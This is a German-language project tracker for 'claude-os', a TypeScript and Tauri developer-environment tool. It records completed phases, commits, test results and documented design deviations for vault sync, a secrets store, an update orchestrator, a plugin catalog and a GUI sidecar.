# Claude Develop Environment OS — Implementierungs-Tracker

**Quelle:** `C:\Users\reapertakashi\Downloads\claude-develop-environment-os.md`
**Plan-Datum:** 2026-05-15
**Gesamtschätzung:** ~120 Stunden
**Architektur-Entscheidungen:** [docs/architecture/adr/](../docs/architecture/adr/)

---

## Phase 0 — Repo-Vorbereitung (2 h, Komplexität L)

**Ziel:** Sauberer Ausgangspunkt; USB-Reste raus, Branch + Tracking-Struktur steht.

- [x] Branch `feature/claude-os-v1` aus `main` erstellen (2026-05-16)
- [x] USB-Sync-Scripts löschen: `sync-from-usb.bat`, `sync-to-usb.bat` → Commit `a300592`
- [x] Legacy-Launcher in `legacy/` verschieben: `start.bat`, `start.ps1`, `setup.bat`, `sync-vault-pull.bat`, `sync-vault-push.bat` → Commit `954ee9b`
- [ ] GitHub-Issues: Epic + 1 Tracking-Issue pro Phase (oder lokale Issue-Liste falls kein GitHub-Sync gewünscht) — *pending User-Entscheidung*
- [x] `tasks/todo.md` (diese Datei) committen → Commit `1466bd5`
- [x] `tasks/lessons.md` initialisieren → Commit `1466bd5`

**Test-Kriterium:** `git log --oneline` zeigt Cleanup-Commits; `git ls-files | grep -E "sync.*usb"` leer. **Status: erfüllt (3/3 Commits, sauberer Working-Tree).**

---

## Phase 1 — Node-Bootstrap und Doctor MVP (16 h, M, deps: Phase 0)

**Ziel:** Lauffähiges TypeScript-Projekt mit `claude-os doctor` als ersten Smoke-Test.

- [x] `package.json` (Node ≥ 20, ESM, scripts; current-version Deps post npm view audit) → Commit `076acd5` + `9c3b432` (commander v14, pino v10, typebox v0.34, keyring v1.3 — alle latest)
- [x] `tsconfig.json` strict, Pfad-Aliase (`baseUrl` entfernt für TS 7 compat, `types: ["node"]` für globals) → Commit `076acd5` + `9c3b432`
- [x] **biome v2.3 (per ADR-0014)**: `biome.json` mit `recommended: true`, strict TS-Rules → Commit `2dafcea` (user-authored wegen config-protection-Hook)
- [x] **husky + lint-staged**: `.husky/pre-commit` ruft `npx lint-staged`; lint-staged-Glob `*.{ts,tsx,js,jsx,json}` → `biome check --write --no-errors-on-unmatched`. biome v2.4-Migration (`files.ignore` → `files.includes`, `organizeImports` → `assist.actions.source.organizeImports`) via `npx biome migrate --write`. Korrupter `core.hooksPath = --version/_` aus früherem broken `prepare`-Run via unset+re-prepare gefixt. → Commit `4909fb2`
- [x] **Vitest** statt Jest (pivot wegen ESM-Pain, siehe `lessons.md` 2026-05-16 Eintrag); Coverage-Threshold 70 % in `vitest.config.ts` → Commit `9c3b432`
- [x] `src/core/environment/root-resolver.ts` mit Env-Var- und Repo-Detect-Fallback + `types.ts` + `index.ts` → Commit `9c3b432`
- [x] `src/core/doctor/` — 5 Checks: Mount, Node-Version, Git, `bin/claude{,.exe}`-Existenz, Schreibrechte → Commit `5a3b6ab` (16 tests, all 5 checks runnable, runDoctor() handles RootNotFoundError gracefully)
- [x] `src/cli/index.ts` mit **commander v14**, Command `doctor` aktiv; globaler `--json`-Flag mit zentralem Renderer in `src/cli/presenters/doctor.ts` (ASCII-Marker für cmd.exe-Compat) → Commit `5a3b6ab`
- [x] `src/core/logging/` — pino-Factory mit Redaction-Path-Liste in `redact-paths.ts` (Pflicht-Code-Review-Gate); pino-roll + Stderr-Mirror deferred zu Phase 6 (per ADR-0013 §3 Production-Transport) → Commit `983c805`
- [x] Redaction-Tests: 15 Tests, Pflicht-`[REDACTED]`-Coverage für ANTHROPIC_API_KEY, CLAUDE_CODE_OAUTH_*, GITHUB_TOKEN, *.password, *.token, credentials.* → Commit `983c805`
- [x] Shims: `claude-os.cmd` (Windows) + `claude-os` (POSIX, +x bit gesetzt via git index) am Repo-Root — 2026-05-17. Smoke: `./claude-os doctor --json` retourniert valid JSON über den Shim.
- [x] Unit-Tests Root-Resolver: 11 Tests + 9 detectCloudProvider-Tests = 20 grün → Commit `9c3b432`
- [x] Unit-Tests Doctor-Checks: 11 tests in checks.test.ts + 6 tests in runner.test.ts → 36 total (env=20, doctor=16), alle grün → Commit `5a3b6ab`
- [x] `npm link` Smoke: `npm run build && npm link` registriert globalen Shim `C:\Users\reapertakashi\AppData\Roaming\npm\claude-os.ps1`; `claude-os doctor` → `Summary: 5 ok, 1 warn, 0 fail (54ms total)`. WARN ist erwarteter `claude-binary not found in bin/` (User's `claude.exe` liegt in `~/.local/bin/`, nicht im claude-portable-Repo-CWD). — 2026-05-17
- [x] README-Skelett (Deutsch, Bootstrap-Sektion): Vollständiger Rewrite mit Was-es-ist / Architektur-in-60-Sekunden / Bootstrap / CLI-Overview. → Commit `9eb699b`
- [x] **TypeBox-Setup (per ADR-0012)**: `@sinclair/typebox` als Dep (war seit Phase 1a installiert via validation/format.ts); `src/core/schemas/{environment-manifest,index}.ts` + Test (19 Cases). Schema beschreibt `.claude-os-root`-Marker-Payload mit `version: 1` Literal, ISO-8601 `createdAt` (eigener `pattern` statt `format: 'date-time'` — vermeidet ajv-formats peer-dep), Optional `name`/`cloudProvider`/`notes`, `additionalProperties: false`. JSON-Schema-Export via `JSON.parse(JSON.stringify(...))` — TypeBox 0.34 removed `Type.Strict()`, da Schemas bereits spec-konform sind und JSON.stringify Symbol-keyed Metadata per ES2020 verwirft. → Commit `dc3ffc5`
- [x] `src/core/validation/format.ts` + `assertValid` + `ValidationError` (~100 LOC) für TypeBox/Ajv-Errors → Commit `0066278`
- [x] Validation-Tests: 16 Tests, formatPath JSON-Pointer→dotted-bracket, formatErrors/assertValid für valid/invalid/constraint-violation → Commit `0066278`

**Test-Kriterium:** `npm test` + `npm run lint` grün; `claude-os doctor` grüner Status. **Status: erfüllt** — `npx vitest run` 427/428 grün (1 long-running gated); `claude-os doctor` 5 ok / 1 warn (warn = erwarteter `claude-binary not found in bin/` da im claude-portable-Repo-CWD ausgeführt; User's `claude.exe` liegt in `~/.local/bin/`).

**Follow-up offen (separat von Phase 1 tail):** biome v2.4-Migration deckte 149 errors / 10 warnings im Source-Tree auf. Meist Suppression-Comment-Drift (Rule-Namen in v2.4 umbenannt) + neue Rules die v2.3 nicht enforce hat. Eigener Cleanup-Sprint. Pre-commit-Hook ist unaffected, da lint-staged nur auf gestagete Files läuft.

### Phase 1.5 / Phase 1g — Git-Metadaten-Migration (abgeschlossen 2026-05-16)

- [x] `claude-os doctor --migrate-git-metadata`: verschiebt `vault/.git/` nach `%APPDATA%/claude-os/git-metadata/vault.git/` via `git init --separate-git-dir` (Standalone-Modus — skippt regulärer Check-Suite). Implementiert in `src/core/git-metadata/migrator.ts` mit 5 States (`not-needed`, `no-git-dir`, `already-migrated`, `migrated`, `error`).
- [x] Idempotenz-Test: zweiter Aufruf erkennt gitfile + canonical path und retournt `already-migrated` ohne FS-Mutation.
- [x] Neue paths-Domain `src/core/paths/`: plattform-bewusste per-machine Pfade (win32 `%APPDATA%/claude-os/`, POSIX `${XDG_CONFIG_HOME:-~/.config}/claude-os/`) mit `$CLAUDE_OS_DATA_DIR`-Override für Tests; expose `gitMetadataDir`, `dataDir`, `logsDir` + `externalGitDirFor(repoName)`.
- [x] Tests: 13 paths-Tests + 8 migrator-Tests (real git init via simple-git, Idempotenz-Roundtrip, Gitfile-Pointing-Elsewhere-Error, Clobber-Prevention, custom workTreeName).

---

## Phase 2 — Vault-Sync-Subsystem (abgeschlossen 2026-05-17)

**Ziel:** Branch-aware Snapshot-Sync für Vault, push-only, mit Idle-Detection statt Cron (obsidian-git-Pattern). Conflict-Policy in 3 Modi, persistenter Busy-Flag. Aufgeteilt in 6 Sub-Phasen (2a–2f).

- [x] Phase 2a — `src/core/git/git-service.ts` (per ADR-0008): typed `simple-git`-Wrapper, `GitError`-Hierarchie (`GitNotInstalledError` / `GitLockfileError` / `GitMergeConflictError`), `mapError()` parsed stderr → typed errors. Doctor `checkWindowsLongPaths()` warnt bei `core.longpaths != true` mit One-Line-Fix. → Commit `434fc43`
- [x] Phase 2b — `domains/vault-sync/{types,branch-detect,snapshot,index}.ts`. `detectVaultBranch()` refused detached HEAD (Fix Memory-S251 — kein `main`-Hardcoding). Snapshot-Pipeline stage→commit→push mit ISO-timestamped Message `claude-os snapshot <ISO>`; Best-Effort-Push lässt lokalen Commit auf push-failed stehen. → Commit `3474d41`
- [x] Phase 2c — `vault-sync/{gitignore-template,busy-flag}.ts`. Default-Ignore-Liste curated aus obsidian-git #114 (workspace*, .obsidian/cache, .trash, claudeos-machine-state, OS-Cruft). BusyFlag persistiert `{busy, reason, pid, hostname, acquiredAt}` als JSON unter `<dataDir>/vault-sync-state.json` (atomic tempfile+rename, 0o600). Same-host stale-PID-Detection via `process.kill(pid, 0)`; cross-host nur via `vault unlock` (forceReset). → Commit `0b3fb26`
- [x] Phase 2d — `vault-sync/scheduler.ts`: chokidar-basierter Idle-Watcher mit separatem `setTimeout(idleMs)` (NICHT awaitWriteFinish für Multi-Minuten-Window — Issues #384/#675); `awaitWriteFinish {2000ms/100ms}` parallel für Per-File-Save-Smoothing; Cloud-Mount-Auto-Detect → polling-Mode `{usePolling: true, interval: 2000, binaryInterval: 5000}` (Issues #895/#998/#225); In-flight-Guard verhindert Double-Fire. Test-Seams `chokidarFactory`/`timers`/`now()` injectable. → Commit `9523116`
- [x] Phase 2e — `vault-sync/conflict-policy.ts`: 3-Modi Push-Reject-Handling. `abort` Hard-Fail mit Doctor-Hint, `prefer-local` Fetch+`force-with-lease` (Lease schützt gegen echte concurrent writers), `prefer-remote` legt Backup-Branch `claude-os/backup/<branch>/<ISO>` (colons→hyphens für ref-name-Legality) und rewindet via `git reset` auf remote tip. `isPushConflictError` Predicate exportiert für Caller-Decision. → Commit `c0d93e2`
- [x] Phase 2f — `vault-sync/vault-config.ts` (atomic JSON-Persistence) + CLI-Wire: `vault snapshot` (acquires busy-flag → snapshot → on push-failed apply policy → release), `vault status` (text/--json), `vault conflict-mode`, `vault schedule --enable/--disable [--idle-seconds N]` (Scheduler runs in Phase-6-Sidecar; CLI persistiert nur Config), `vault unlock` (forceReset busy-flag), `vault init-gitignore` (idempotent merge). → Commit `57d6c63`

**Test-Kriterium:** Real CLI-Smoke (Windows, temp bare-repo fixture): `vault status` → defaults; `echo X > vault/n.md` + `vault snapshot` → `[OK] master: pushed 1 files to origin`; `vault conflict-mode prefer-local` persistiert; `vault schedule --enable --idle-seconds 60` persistiert; `vault init-gitignore` legt 11 Default-Lines; `vault unlock` graceful no-op. **Status: erfüllt.**

**Tests-Gewinn:** +64 (2a 13, 2b 11, 2c 15, 2d 9, 2e 8, 2f 8). Total 191/191 grün (+1 long-running gated). Alle Sub-Module gegen reale bare-repo + tmpdir-Fixtures + FakeWatcher EventEmitter unit-getestet.

**v1-Abweichungen (transparent):**

- **Busy-Flag als JSON statt SQLite** — atomic tempfile+rename + 0o600 reicht für single-process Sidecar-Modell; sql.js-Migration nicht nötig. ADR-0002 spec'te sqlite, aber JSON ist robuster ohne native-build.
- **Working-tree merge-conflicts explizit out-of-scope** für v1 automatic policy — `conflict-policy` adressiert ausschließlich push-rejection-Divergenzen. Echte merge-conflicts bleiben Hard-Fail mit Doctor-Hinweis (Phase 6 evtl. UI).
- **Real-FS-Scheduler-Roundtrip + BusyFlag-Integration** als Long-Running-E2E deferred zur Sidecar-Phase — Scheduler-Unit-Tests nutzen FakeWatcher; reine FS-Integration kommt mit Phase-6-Tauri-Sidecar-Lifecycle (Scheduler läuft dort, nicht im CLI-Prozess).
- **`force-push --with-lease` statt Confirm-Prompt** in `prefer-local` — Lease ist sicherer als interaktiver Bestätigungsprompt (atomic against concurrent writers). v1 hat keine TTY-Prompt-Infra; Phase 6 kann GUI-Confirm darüberlegen.
- **TOCTOU-Race im Busy-Flag dokumentiert** — v1 vertraut auf single-process-Scheduler + user-serialisiertes CLI. Echter Mutex (file-locking/lockfile) ist Phase-6-Hardening.

---

## Phase 3 — Hybrid-CLI mit AI-Delegation (abgeschlossen 2026-05-17)

**Ziel:** Vollständiger `claude-os`-Command-Tree und stabile `claude.exe`-Anbindung. Aufgeteilt in 5 Sub-Phasen (3a–3e).

- [x] Phase 3a — Command-Stubs für `update`, `vault`, `catalog`, `secrets`, `agent`, `auth`, `ai` → Commit `d878c1a`
- [x] Phase 3b — `src/domains/claude-bridge/spawn.ts` mit `child_process.spawn` + `stdio: 'inherit'` (kein 120s-Cutoff, Fix Memory 569/577/578) → Commit `4f26d80`
- [x] Phase 3b — SIGINT-Propagation mit 5s-Grace → SIGKILL (zweite Ctrl-C eskaliert sofort); SIGTERM-Forward → Commit `4f26d80`
- [x] Phase 3b — Heartbeat alle 10s als strukturiertes pino-Log mit `{pid, elapsedMs}` → Commit `4f26d80`
- [x] Phase 3b — `resolve-binary.ts` mit `<root>/bin/claude{,.exe,.cmd}` → `$PATH`-Walk-Fallback (deckt User's `~/.local/bin/claude.exe`-Install, Memory 549/550) → Commit `4f26d80`
- [x] Phase 3c — `cli/commands/ai.ts` forwarded argv 1:1, Exit-Code propagiert (Signals → 130/143/137), BinaryNotFoundError → exit 127 → Commit `4f26d80`
- [x] Phase 3d — `domains/secrets/` mit `KeyringStore` (@napi-rs/keyring, Service-Name `claude-os`) + `EncryptedFileStore` (AES-256-GCM, PBKDF2-SHA-256 mit 600k iterations, 16-byte salt, 12-byte IV, 16-byte GCM-tag, atomic write via tempfile+rename, mode 0o600) → Commit `0f766f5`
- [x] Phase 3d — `factory.ts` Backend-Detection: `$CLAUDE_OS_SECRETS_BACKEND` Override → `probeKeyring()` set+delete sentinel → encrypted-file fallback → Commit `0f766f5`
- [x] Phase 3d — CLI: `secrets set/get/list/delete` mit --json-Mode, Values nie geloggt → Commit `0f766f5`
- [x] Phase 3e — Long-Running-E2E (180s) via vitest's `describe.skipIf` gated hinter `$RUN_SLOW_TESTS=1` (regulärer `npm test` bleibt schnell) → (commit pending nach Test-Run)

**Test-Kriterium:** Manueller Smoke: `claude-os ai --help` reicht Anthropic-Help durch. **Status: erfüllt** — auf User's Windows-Maschine `node dist/cli/index.js ai --help` resolved `~/.local/bin/claude.exe` via `$PATH`, forwarded `--help`, Anthropic-CLI druckte sein eigenes Help, Exit 0 propagiert.

**Tests-Gewinn:** +33 (3a 0, 3b 16, 3c 0, 3d 17, 3e 1 gated). Total 121/121 grün ohne Long-Slow-Tag, 122 mit `RUN_SLOW_TESTS=1`.

---

## Phase 4 — Update-Orchestrator (abgeschlossen 2026-05-17)

**Ziel:** Tiered Auto-Update beim Start; Plugin-Updates explizit; Selective-Merge-Pattern nach ADR-0005. Aufgeteilt in 6 Sub-Phasen (4a–4f).

- [x] Phase 4a — `domains/update-orchestrator/env-repo.ts` + `skills-repo.ts` mit `git pull --ff-only`, 7-state UpdateState (up-to-date/updated/cloned/aborted-dirty/aborted-diverged/no-remote/error). GitService.clone() static + pull-with-ffOnly. → Commit `eb3e80d`
- [x] Phase 4b — `BackupManager` mit `snapshot(scope, sourceDir)` / `restore(ts|'latest', dest)` / `prune(retention=5)` / `list()`. Layout `<dataRoot>/backups/update-<ISO-safe-ts>/{scope/,manifest.json}`. → Commit `2451433`
- [x] Phase 4c — `ZoneClassifier`: `.skill-lock.json` (JSON statt YAML — Lesson 2026-05-17) + Frontmatter-Regex `claudeos: locked`; klassifiziert pro Datei in System / Personal / Locked. → Commit `0908298`
- [x] Phase 4d — `DiffEngine` über `diff@9` (Binary-Detect via NUL-byte, 5-state DiffStatus) + presentation-agnostic `ReviewLoop` mit injectable decide+applyUpgrade. Locked/personal/unchanged/removed auto-keep; system+modified ruft IMMER decide (auch mit --auto-accept). → Commit `5221a06`
- [x] Phase 4e — `ResumableChecklist` mit atomic markdown persistence (`<dir>/upgrade-checklist-<ISO-safe-ts>.md`). `create()` / `load()` / `loadLatest(scope)` (skipt completed Runs default) / `markDone()` / `complete()` / `abandon()`. → Commit `239a4de`
- [x] Phase 4f — `plugins.ts` placeholder mit separater Log-Datei `<logsDir>/plugin-update-<ts>.log` (Memory-587/593-Mitigation steht; echte Install-Logik braucht Phase-5-Catalog). CLI `update [--env|--skills|--plugins|--all|--auto-accept|--rollback [ts]|--resume]` end-to-end wired. → Commit `5f93a4c`

**Test-Kriterium:** Real CLI-Smoke (Windows): `update --env` retourniert `[WARN] env-repo working tree dirty (11 files); refusing to pull` mit Exit 2; `update --plugins` retourniert `[WARN] plugins: plugin updates require Phase 5 catalog` mit Exit 2; `update` ohne Flag → Hint + Exit 1; `update --rollback` listet Backups oder Hint wenn keine vorhanden.

**Tests-Gewinn:** +50 (4a 9, 4b 12, 4c 12, 4d 17, 4e 12, 4f 0 — CLI integration deferred). Domain-Module sind direct unit-tested gegen reale bare-repo + tmpdir-Fixtures. Total 245/245 grün (+1 long-running gated).

**v1-Abweichungen von ADR-0005 (transparent):**

- `.skill-lock.json` statt YAML — JSON ist robuster (kein eigener Parser), gleiches Verhalten. ADR-0005 §38 erwähnt YAML als claudesidian-Vorbild, ist aber nicht zwingend.
- **Full selective-merge orchestrator deferred**: Die einzelnen Pieces (BackupManager + ZoneClassifier + DiffEngine + ReviewLoop + ResumableChecklist) sind isoliert getestet und einsatzbereit. Die CLI-Composition (upstream-mirror-clone → walk → classify → diff → review-loop → checklist → apply) ist in `update.ts` skizziert aber nicht voll verdrahtet. `update --skills` bei `aborted-dirty` zeigt einen Hint statt zu starten. Vollständiger Flow ist eine kleinere Folge-Iteration.
- **Interactive review** (enquirer-Prompts) deferred — die ReviewLoop akzeptiert einen injectable `decide`-Callback; eine echte TTY-UI ist Phase-4-Tail oder Phase-6-GUI. v1 lebt mit `--auto-accept` für clean Diffs.
- **Plugin install path** deferred zu Phase 5 (braucht Catalog für Manifest-Resolution).

---

## Phase 5 — Agent-OS-Subsystem + Catalog/Skill-Registry (abgeschlossen 2026-05-17)

**Ziel:** Account-Auth, JSON-Lines-Agent-Runs (ADR-0002), Vault-Output-Persistence, Catalog-System-Foundation (ADR-0009 + ADR-0010). Aufgeteilt in 8 Sub-Phasen (5a–5h).

- [x] Phase 5a — `domains/agent-runs/{types,jsonl-writer,index}.ts`. AgentRunRecord-Schema mit Project-Column (Memory-565 Fix). Append-only JSONL via `appendFileSync`, eine Datei pro `(project, machineId)`. → Commit `(5a)`
- [x] Phase 5b — `agent-runs/index-builder.ts`. **JSON-basiert statt SQLite** für v1 (kein zusätzlicher native-build Dep). Walks JSONL → sortiert timestamp-DESC → atomic write. Query-API mit Filter (project, machineId, sinceIso, limit). Malformed-Lines tolerant. → Commit `2c30490`
- [x] Phase 5c — `agent-runs/{repository,vault-writer}.ts`. Public Façade mit `record/list/show/byProject/refreshIndex`. VaultWriter emittiert `<vault>/agent-runs/<project>/<ISO-safe>.md` mit YAML-Frontmatter + Prompt + stdio-inherit-Caveat. → Commit `(5c)`
- [x] Phase 5d — `domains/auth/{types,credentials,profile-manager,state-check}.ts`. State-Check-Resolution-Order: CI-Env → CLI-Subprocess (injectable) → `.credentials.json` File → no-creds. ProfileManager mit `$ANTHROPIC_CONFIG_DIR`-Sandboxing für Multi-Account. Doctor-Schema-Drift-Check für `.credentials.json`-Felder. → Commit `(5d)`
- [x] Phase 5e — `domains/catalog/{source-resolver,tarball-installer}.ts`. Parser für `marketplace:` / `github:owner/repo[@ref][:subPath]` / `local:` Sources. Tarball-Installer mit sha256-Cache-Key, idempotenter Reuse, codeload.github.com-URL für public repos. → Commit `(5e)`
- [x] Phase 5f — `catalog/{marketplace-registry,scope-merger,cache-cleaner}.ts`. File-based Registry-Loader (ETag-URL-Fetch deferred), Scope-Merge (Project wins über User), 30-day Tarball-Retention. → Commit `(5f)`
- [x] Phase 5g — `catalog/{capability,capability-resolver}.ts`. Deterministischer DFS-Resolver mit 4 ResolutionError-Subtypen (MissingProvider, VersionConflict, CyclicDependency, AmbiguousProvider). Eigener Mini-Comparator (`>=`, `>`, `<=`, `<`, `=`) ohne semver-Dep. **2 explizite Regression-Tests gegen Memory-587/593 + ruflo #1676 Reproducer.** → Commit `(5g)`
- [x] Phase 5h — CLI-Wire: `agent list|show|replay`, `auth status|login|profile create|use|list|delete`, `catalog install|resolve` (echte impl) + `catalog list|uninstall|enable|disable|update|lock|sync` (Phase-6-Sidecar-Hint). → Commit `59e16a9`

**Test-Kriterium:** Echtes Smoke-Roundtrip auf User's Windows-Maschine — `auth status` retourniert `source=file, loggedIn=true, scopes=user:*` aus realer Anthropic-Login. `agent list` schreibt korrekt "(no agent runs recorded yet)". `catalog` rendert install/resolve mit Phase-6-Hints für staged subcommands.

**Tests-Gewinn:** +135 (5a 12, 5b 17, 5c 16, 5d 35, 5e 26, 5f 28, 5g 29, 5h 0 — CLI integration deferred). Domain-Module unit-tested gegen reale bare-repos + tmpdir-Fixtures + injektive Mocks für Subprocess + Fetch. Total 408/408 grün.

**v1-Abweichungen (transparent):**

- **Agent-Runs Index in JSON statt SQLite** — kein native-build-dep für v1; sql.js drop-in für v1.x. Performance für Early-Adoption-Datensätze trivial.
- **macOS-Keychain-Read deferred** zu v1.x — `.credentials.json`-Fallback funktioniert auf macOS auch.
- **Refresh-Mutex / proaktiver Refresh deferred** — claude.exe besitzt den Refresh; wir warnen bei expiresAt < 1h via state-check.warning. Regression-Tests gegen claude-code #50743/27933/31095 sind deferred (Race-Reproducer braucht echte concurrent claude.exe-Spawns).
- ~~**Marketplace ETag-URL-Fetch deferred** — der RegistryLoader-Pattern ist injectable, file-Loader shipped, URL-Loader fehlt.~~ → **erledigt 2026-05-17 Phase 5k** (Commit folgt). `src/domains/catalog/marketplace-url-loader.ts` mit injektivem `fetch`-Hook, ETag-Cache unter `<cacheDir>/marketplace-<sha16>.{json,etag}`, `If-None-Match`+304-Roundtrip. `validateRegistry` aus `marketplace-registry.ts` herausgezogen für Shared-Use. +13 Tests inkl. 304-null-body-Spec-Workaround und Multi-URL-Cache-Key-Disjunktion.
- ~~**Capability-Resolver Version-Constraints** beschränkt auf `>=` / `>` / `<=` / `<` / `=` (keine `^` / `~`-Ranges in v1).~~ → **erledigt 2026-05-17 Phase 5j** (Commit `fee2aff`). `^` + `~` implementiert per npm-semver-Regel (`^1.2.3` → `>=1.2.3 <2.0.0` mit left-most-non-zero für major=0; `~1.2.3` → `>=1.2.3 <1.3.0`). +13 Tests inkl. major-zero/patch-zero Edge-Cases. `~1` (nur major) bleibt v1-Simplification = `==1.0.0` (für "any 1.x.x" `^1` nutzen — dokumentiert).
- **Lazy-Activation + Uninstall-Hooks** deferred zur Phase-6-Sidecar-Integration.
- **`--auto-deps` flag** + transitive marketplace resolution deferred — v1 erfordert manuelle Pre-Installation der Provider.
- ~~**catalog.json / catalog.lock.json Schema + Validator deferred** zur Phase-6-Sidecar-Integration. `catalog list/uninstall/enable/disable/update/lock/sync` zeigen Phase-6-Pointer.~~ → **vollständig erledigt 2026-05-17**: **Phase 5i** (Commit `cff079c`) schema + store + `list`; **Phase 5l** (Commit `4fa4f7d`) `enable/disable/uninstall` real; **Phase 5m** (Commit `bb195f0`) `lock` real via `lockCatalog`-Builder; **Phase 5n** (Commit folgt) `sync` (`applyLock` → extract enabled github-entries aus Cache nach `<root>/config/{skills|plugins|mcp}/<id>` via strip=1 tar.extract) + `update [<id>]` (full-relock alias für `lock`, oder Single-Entry-Update mit `mergeLockEntry` merge into existing lock). Komplette Catalog-Pipeline shipped. Bindings=[] bleibt offen (Phase 5o — Plugin-Manifest-Reader + `resolveCapabilities`-Integration).
- **Skill-Pack-Import** als bundled marketplace deferred — User kann via direkter `github:`-Source nutzen.
- **Catalog-Lock bindings: []** (v1.x): `lockCatalog` emittiert leere `bindings`-Arrays. Echte capability-resolver-Integration braucht Plugin-Manifest-Reader (entweder via Tarball-Peek vor extract oder Post-Sync re-read) + `resolveCapabilities()`-Run. Schema ist forward-kompatibel; aktuelle Realität (Plugins ohne `requires`/`provides`) macht den Aufwand für v1 nicht wert. Sidecar-View kann später lazy nachzichen.
- **Coverage-Scope** (2026-05-17): `npm run ci` Coverage erfasst ausschließlich unit-testbaren Code. Ausgeschlossen: `src/cli/**` (Commander-Glue, via real-binary Smoke-Tests verifiziert), `src/domains/secrets/keyring-store.ts` (native @napi-rs/keyring, gated hinter Phase-3d-Smoke), `src/domains/update-orchestrator/plugins.ts` (Phase-4f-Placeholder bis Phase-6-Sidecar). Aktuelle Werte: 90/78/93/92 % stmt/branch/func/line.

---

## Phase 6 — Tauri-GUI (26 h, H, deps: Phase 3+5)

**Ziel:** Desktop-App-Shell mit Claude-Desktop-Look-and-Feel (ADR-0001, ADR-0006). Aufgeteilt in 8 Sub-Phasen (6a–6h).

- [x] **Phase 6a — Tauri-Rust-Shell-Scaffold** (2026-05-17). `gui/src-tauri/` mit Cargo.toml (Tauri 2.x, opt-level=s release-profile), `build.rs` (`tauri_build::build()`), `src/main.rs` thin entry, `src/lib.rs` mit `tauri::Builder::default()` + leerem `.setup()` (sidecar-spawn folgt in 6d), `tauri.conf.json` v2 (identifier `net.iteenschmiede.claude-os`, window 1280×800, bundle-targets msi/dmg/appimage), `capabilities/default.json` (Tauri v2 enforced permission system, `core:default`-Baseline). `gui/package.json` mit `@tauri-apps/cli` + `@tauri-apps/api`. `gui/.gitignore` für `src-tauri/target/`, `node_modules/`, `dist/`, `binaries/`. `gui/README.md` mit Voraussetzungen + `cargo check`-Verifikationsschritt. **Deferrals**: Icons (6h), `gui/src/index.html` Vite-Frontend (6e). → Commit pending.
- [x] **Phase 6b — Sidecar-Binary-Build-Script** (2026-05-17). `scripts/build-sidecar.{ps1,sh}` + `scripts/build-sidecar.mjs` cross-platform-Dispatcher; npm root-Script `sidecar:build`. Pipeline: `npm run build` → `rustc -Vv | host` triple-Resolution → switch-mapping zu `pkg` `node{major}-{platform}-{arch}` → `npx @yao-pkg/pkg@latest` Output nach `gui/src-tauri/binaries/claude-os-sidecar-<TRIPLE>.exe` mit Hoppscotch-Pattern (Tauris `bundle.externalBin` Auto-Discovery-konform). Supportet 6 Triples (x86_64-pc-windows-msvc, aarch64-pc-windows-msvc, x86_64/aarch64-apple-darwin, x86_64/aarch64-unknown-linux-gnu). Native-Module-Caveat dokumentiert: `@napi-rs/keyring` `.node`-Bindings werden via `CLAUDE_OS_SECRETS_BACKEND=file`-Env-Var-Force im Sidecar umgangen (Wire-up in 6d). → Commit pending.
- [x] **Phase 6c — JSON-RPC-Bridge** (Rust + Node) (2026-05-17). Node-Seite: `src/sidecar/rpc.ts` mit `RpcDispatcher` (method-registry, `domain.operation`-Namen) + `runRpcServer({input,output,dispatcher})` (NDJSON-Loop über `node:readline`). `src/sidecar/index.ts` Entry-Point registriert `ping` + `shutdown` als RPC-Methods; weitere Domains stoßen in 6f hinzu. Rust-Seite: `gui/src-tauri/src/rpc.rs` mit `RpcClient::new(stdin,stdout)` (tokio `AsyncBufReadExt::lines` reader, oneshot-routed pending-map by `id`) + `call(method, params) -> Result<Value, RpcError>`. Cargo-Deps: `tokio { features=[macros,rt-multi-thread,io-util,process,sync] }`. **Deviation von Spec**: `kkrpc` als Lib NICHT verwendet — eigener JSON-RPC-2.0-NDJSON-Dispatcher (~100 LOC Node, ~120 LOC Rust). Begründung: `kkrpc` hat eigene Wire-Format (nicht JSON-RPC 2.0), erfordert `kkrpc-rs` für Rust-Seite — was die Todo explizit ausschließt. Eigene Implementierung ist Standards-konform, transport-agnostisch (in-memory streams für Tests), und Symmetrie auf beiden Seiten. Tests: +12 vitest unit-tests gegen `Readable`/`Writable` (parse-error -32700, invalid-request -32600, method-not-found -32601, dispatch-success, params-pass-through, thrown-error-wrap -32000, notification-fire-and-forget, duplicate-register-rejection, NDJSON-stream-roundtrip). Total **538 tests passing** (526 + 12). → Commit pending.
- [x] **Phase 6d — Sidecar-Lifecycle + Health-Check** (2026-05-17, per ADR-0006). `gui/src-tauri/src/supervisor.rs` mit `SidecarRpc` (atomic-id counter + pending-oneshot-map + `Mutex<Option<CommandChild>>` für take-and-kill), `SupervisorState` (Tauri-managed via `app.manage()`), `start(app, state)`-Loop mit 3-Strikes-Exponential-Backoff (1s/4s/16s — `BACKOFF_LADDER` const), `ping`-Health-Check alle 30s (`HEALTH_INTERVAL` const) parallel zum stdout-router-task (beide signalisieren über `tokio::sync::Notify` wenn der Sidecar sterbt). Nach 3 Strikes: `app.emit("sidecar://failed", {...})` (Frontend-Toast-Handling in 6f). Graceful Shutdown: `lib.rs::on_window_event(CloseRequested)` → `api.prevent_close()` → spawn `graceful_shutdown(state)` → `shutdown`-RPC (2s timeout) → 2s wait → `child.kill()` → `app.exit(0)`. tauri-plugin-shell als Dep (Cargo) + plugin-init (`.plugin(tauri_plugin_shell::init())`); `tauri.conf.json bundle.externalBin = ["binaries/claude-os-sidecar"]` (Hoppscotch-Triple-Auto-Discovery aus 6b); `capabilities/default.json` scope-narrow auf `shell:allow-execute` mit `{name: "binaries/claude-os-sidecar", sidecar: true, args: true}`. **Sidecar-Env**: `CLAUDE_OS_SECRETS_BACKEND=file` injiziert (umgeht native @napi-rs/keyring per 6b-Caveat). Rust-Unit-Tests: 5 für die pure-functions (BACKOFF_LADDER values, next_backoff(0..=3), HEALTH_INTERVAL, SHUTDOWN_GRACE) — laufen mit `cargo test` sobald rustup installiert. **Deviation von Spec**: 2-step shutdown (shutdown-RPC → 2s → kill()) statt 3-step (… → SIGTERM → 2s → SIGKILL) — tauri-plugin-shell's `CommandChild::kill()` ist platform-equivalent zu SIGKILL/TerminateProcess; separater SIGTERM-Schritt nicht exposed. v1-Simplification dokumentiert. **Deferrals**: Frontend-side Read-Only-Mode-Toast (6f wenn UI da ist), Sidecar-Stderr-Forwarding zur Renderer-Konsole als Tauri-Event statt eprintln! (6f), pino-roll Per-Day-Log-Rotation `%APPDATA%/claude-os/logs/sidecar-YYYY-MM-DD.log` aus Node-Sidecar-Entry (6d-tail oder 6f). → Commit pending.
